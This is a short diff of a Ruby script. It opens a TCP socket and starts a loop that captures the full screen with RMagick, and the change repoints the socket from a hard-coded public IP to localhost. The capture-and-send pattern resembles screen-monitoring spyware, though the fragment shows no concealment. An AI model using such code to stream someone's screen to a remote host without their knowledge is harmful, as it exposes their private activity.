@@ -2,7 +2,8 @@ require 'RMagick'
 require 'socket'
 require 'base64'
 
-tcp_server = TCPSocket.new '192.241.213.182', '61400'
+# tcp_server = TCPSocket.new '192.241.213.182', '61400'
+tcp_server = TCPSocket.new 'localhost', '61400'
 
 loop do
     image = Magick::Image.capture {self.filename = 'root'}
